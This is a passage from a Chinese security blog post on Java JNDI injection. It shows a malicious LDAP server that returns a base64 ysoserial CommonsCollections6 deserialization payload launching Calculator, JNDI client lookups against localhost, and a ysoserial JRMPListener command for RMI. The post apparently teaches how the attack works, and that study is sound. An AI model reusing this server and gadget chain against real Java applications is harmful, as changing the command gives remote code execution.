+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">processSearchResult</span> <span class="o">(</span> <span class="n">InMemoryInterceptedSearchResult</span> <span class="n">result</span> <span class="o">)</span> <span class="o">{</span>
+            <span class="n">String</span> <span class="n">base</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="na">getRequest</span><span class="o">().</span><span class="na">getBaseDN</span><span class="o">();</span>
+            <span class="n">Entry</span> <span class="n">e</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Entry</span><span class="o">(</span><span class="n">base</span><span class="o">);</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">sendResult</span><span class="o">(</span><span class="n">result</span><span class="o">,</span> <span class="n">base</span><span class="o">,</span> <span class="n">e</span><span class="o">);</span>
+            <span class="o">}</span>
+            <span class="k">catch</span> <span class="o">(</span> <span class="n">Exception</span> <span class="n">e1</span> <span class="o">)</span> <span class="o">{</span>
+                <span class="n">e1</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="o">}</span>
+
+        <span class="o">}</span>
+        <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">sendResult</span> <span class="o">(</span> <span class="n">InMemoryInterceptedSearchResult</span> <span class="n">result</span><span class="o">,</span> <span class="n">String</span> <span class="n">base</span><span class="o">,</span> <span class="n">Entry</span> <span class="n">e</span> <span class="o">)</span> <span class="kd">throws</span> <span class="n">LDAPException</span><span class="o">,</span> <span class="n">MalformedURLException</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">&#34;javaClassName&#34;</span><span class="o">,</span> <span class="s">&#34;Exploit&#34;</span><span class="o">);</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="c1">// java -jar ysoserial.jar CommonsCollections6 &#39;open /System/Applications/Calculator.app&#39;|base64
+</span><span class="c1"></span>                <span class="n">e</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">&#34;javaSerializedData&#34;</span><span class="o">,</span> <span class="n">Base64</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="s">&#34;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AChvcGVuIC9TeXN0ZW0vQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=&#34;</span><span class="o">));</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ParseException</span> <span class="n">e1</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">e1</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="o">}</span>
+            <span class="n">result</span><span class="o">.</span><span class="na">sendSearchEntry</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
+            <span class="n">result</span><span class="o">.</span><span class="na">setResult</span><span class="o">(</span><span class="k">new</span> <span class="n">LDAPResult</span><span class="o">(</span><span class="n">0</span><span class="o">,</span> <span class="n">ResultCode</span><span class="o">.</span><span class="na">SUCCESS</span><span class="o">));</span>
+        <span class="o">}</span>
+
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+<li>
+<p>客户端</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="k">try</span><span class="o">{</span>
+    <span class="n">String</span> <span class="n">url</span> <span class="o">=</span> <span class="s">&#34;ldap://localhost:1389/Exploit&#34;</span><span class="o">;</span>
+    <span class="n">InitialContext</span> <span class="n">initialContext</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InitialContext</span><span class="o">();</span>
+    <span class="n">initialContext</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">url</span><span class="o">);</span>
+<span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
+    <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+</ul>
+<h3 id="利用rmi反序列化数据"><a href="#利用rmi反序列化数据" class="anchor-link">#</a><a href="#contents:利用rmi反序列化数据" class="headings">利用RMI反序列化数据</a></h3>
+<p>开启JRMP Server</p>
+<pre tabindex="0"><code>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1088 CommonsCollections6 'open /System/Applications/Calculator.app'
+</code></pre><p>客户端连接</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="k">try</span><span class="o">{</span>
+    <span class="n">String</span> <span class="n">url</span> <span class="o">=</span> <span class="s">&#34;rmi://localhost:1088/Object&#34;</span><span class="o">;</span>
+    <span class="n">InitialContext</span> <span class="n">initialContext</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InitialContext</span><span class="o">();</span>
+    <span class="n">initialContext</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">url</span><span class="o">);</span>
+<span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
+    <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><h2 id="参考"><a href="#参考" class="anchor-link">#</a><a href="#contents:参考" class="headings">参考</a></h2>
+<ol>
+<li><a href="https://www.wangan.com/docs/102" target="_blank" rel="noopener">JNDI_「Java Web安全」 - 网安</a></li>
+<li><a href="https://www.cnblogs.com/nice0e3/p/13958047.html" target="_blank" rel="noopener">Java安全之JNDI注入</a></li>
+<li><a href="https://0day.design/2020/02/04/JNDI%E6%B3%A8%E5%85%A5%E9%AB%98%E7%89%88%E6%9C%ACjdk%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">JNDI注入高版本jdk绕过学习</a></li>
+<li><a href="https://blog.csdn.net/caiqiiqi/article/details/105976072" target="_blank" rel="noopener">《JDK 8u191之后的JNDI注入(RMI)》_公众号shadow sock7-CSDN博客</a></li>
+</ol>
+
+            </div>
+
+            
+    
+    
+        <ul class="post-copyright">
+            <li class="copyright-item author"><span class="copyright-item-text">作者</span>：<a href="https://myzxcg.com/" class="p-author h-card" target="_blank" rel="noopener">myzxcg</a></li>
+            
+                
+                
+                
+                
+                <li class="copyright-item link"><span class="copyright-item-text">链接</span>：<a href="/2021/10/Java-JNDI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">https://myzxcg.com/2021/10/Java-JNDI分析与利用/</a></li>
+            
+            <li class="copyright-item license"><span class="copyright-item-text">许可</span>：<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a></li>
+            
+        </ul>
+    
+
+
+
+        </article>
+
+        
+
+        
+
+
+        
+
+
+        
+
+
+        
+    
+    
+        <div class="related-posts">
+            <h2 class="related-title">相关文章：<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon related-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm144 276c0 6.6-5.4 12-12 12h-92v92c0 6.6-5.4 12-12 12h-56c-6.6 0-12-5.4-12-12v-92h-92c-6.6 0-12-5.4-12-12v-56c0-6.6 5.4-12 12-12h92v-92c0-6.6 5.4-12 12-12h56c6.6 0 12 5.4 12 12v92h92c6.6 0 12 5.4 12 12v56z"/></svg></h2>
+            <ul class="related-list">
+                
+                    <li class="related-item">
+                        <a href="/2021/11/Spring-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/" class="related-link">Spring 内存马实现</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/2021/11/Weblogic-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%9E%E7%8E%B0/" class="related-link">Weblogic 内存马分析与实现</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/2021/11/Shiro-%E5%9B%9E%E6%98%BE%E4%B8%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/" class="related-link">Shiro 回显与内存马实现</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/2021/10/Tomcat-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E5%8F%8A%E6%A3%80%E6%B5%8B/" class="related-link">Tomcat 内存马分析及检测</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/2021/10/Tomcat-%E6%9E%B6%E6%9E%84%E4%B8%8EContext%E5%88%86%E6%9E%90/" class="related-link">Tomcat 架构与Context分析</a>
+                    </li>
+                
+            </ul>
+        </div>
+    
+
+
+
+        
+
+
+        
+    <footer class="minimal-footer">
+        
+            <div class="post-tag"><a href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag" class="post-tag-link">#java安全</a></div>
+        
+        
+        
+            
+        
+    </footer>
+
+
+
+        
+
+
+        
+    
+        
+        
+    
+    
+    
+    
+        <ul class="post-nav">
+            
+                <li class="post-nav-prev">
+                    <a href="/2021/10/Ysoserial-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/" rel="prev">&lt; Ysoserial 利用链分析</a>
+                </li>
+            
+            
+                <li class="post-nav-next">
+                    <a href="/2021/10/Java-RMI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/" rel="next">Java RMI分析与利用 &gt;</a>
+                </li>
+            
+        </ul>
+    
+
+
+
+        
+    
+
+        
+            <div class="load-comments">
+                <div id="load-comments">加载评论</div>
+            </div>
+        
+
+        
+
+        
+            <div id="vcomments"></div>
+        
+
+        
+
+        
+    
+
+
+
+    </div>
+</main>
+
+
+            
+    <div id="back-to-top" class="back-to-top">
+        <a href="#"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon arrow-up"><path d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6 0-33.9L207 39c9.4-9.4 24.6-9.4 33.9 0l194.3 194.3c9.4 9.4 9.4 24.6 0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3 0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z"/></svg></a>
+    </div>
+
+
+            
+    <footer id="footer" class="footer">
+        <div class="footer-inner">
+            
+
+            
+    
+        <ul class="socials"><li class="socials-item">
+                    <a href="https://github.com/myzxcg" target="_blank" rel="external noopener" title="GitHub"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon social-icon"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg></a>
+                </li><li class="socials-item">
+                    <a href="https://twitter.com/myzxcg" target="_blank" rel="external noopener" title="Twitter"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon social-icon"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg></a>
+                </li><li class="socials-item">
+                    <a href="mailto:myz.xcg@gmail.com" target="_blank" rel="external noopener" title="Email"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon social-icon"><path d="M464 64H48C21.49 64 0 85.49 0 112v288c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm0 48v40.805c-22.422 18.259-58.168 46.651-134.587 106.49-16.841 13.247-50.201 45.072-73.413 44.701-23.208.375-56.579-31.459-73.413-44.701C106.18 199.465 70.425 171.067 48 152.805V112h416zM48 400V214.398c22.914 18.251 55.409 43.862 104.938 82.646 21.857 17.205 60.134 55.186 103.062 54.955 42.717.231 80.509-37.199 103.053-54.947 49.528-38.783 82.032-64.401 104.947-82.653V400H48z"/></svg></a>
+                </li><li class="socials-item">
+                    <a href="/rss.xml" target="_blank" rel="external noopener" title="RSS"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon social-icon"><path d="M19.199 24C19.199 13.467 10.533 4.8 0 4.8V0c13.165 0 24 10.835 24 24h-4.801zM3.291 17.415c1.814 0 3.293 1.479 3.293 3.295 0 1.813-1.485 3.29-3.301 3.29C1.47 24 0 22.526 0 20.71s1.475-3.294 3.291-3.295zM15.909 24h-4.665c0-6.169-5.075-11.245-11.244-11.245V8.09c8.727 0 15.909 7.184 15.909 15.91z"/></svg></a>
+                </li></ul>
+    
+
+
+            <div class="site-info">©&nbsp;2021&nbsp;myzxcg&nbsp;| Powered by <a href="https://github.com/reuixiy/hugo-theme-meme" target="_blank" rel="noopener">MemE</a>
+              </div>
+
+            
+        </div>
+    </footer>
+
+
+        </div>
+        
+
+        
+
+
+
+
+
+
+    
+
+        
+
+        
+            <script>
+    function loadComments() {
+        if (typeof Valine === 'undefined') {
+            var getScript = (options) => {
+                var script = document.createElement('script');
+                script.defer = true;
+                script.crossOrigin = 'anonymous';
+                Object.keys(options).forEach((key) => {
+                    script[key] = options[key];
+                });
+                document.body.appendChild(script);
+            };
+            getScript({
+                src: '//unpkg.com/valine@latest/dist/Valine.min.js',
+                onload: () => {
+                    newValine();
+                }
+            });
+        } else {
+            newValine();
+        }
+    }
+    function newValine() {
+        new Valine({
+            el: '#vcomments',
+            appId: '6Fu9AJHglaqmAVjpYMdOOBEi-MdYXbMMI',
+            appKey: '0GcKEskKSnNfqn5dbNITfO4H',
+            placeholder: '有问题欢迎交流',
+            path: location.pathname,
+            avatar: 'mp',
+            meta: ["nick","mail","link"],
+            pageSize:  10 ,
+            lang: 'zh-cn',
+            visitor:  false ,
+            highlight:  true ,
+            avatarForce:  false ,
+            recordIP:  true ,
+            serverURLs: '',
+            emojiCDN: '',
+            emojiMaps: {},
+            enableQQ:  false ,
+            requiredFields: []
+        });
+    }
+</script>
+
+        
+
+        
+
+        
+
+    
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/medium-zoom@latest/dist/medium-zoom.min.js"></script>
+
+<script>
+    let imgNodes = document.querySelectorAll('div.post-body img');
+    imgNodes = Array.from(imgNodes).filter(node => node.parentNode.tagName !== "A");
+
+    mediumZoom(imgNodes, {
+        background: 'hsla(var(--color-bg-h), var(--color-bg-s), var(--color-bg-l), 0.95)'
+    })
+</script>
+
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/instant.page@5.1.0/instantpage.min.js" type="module" defer></script>
+
+
+
+
+
+
+
+    </body>
+</html>
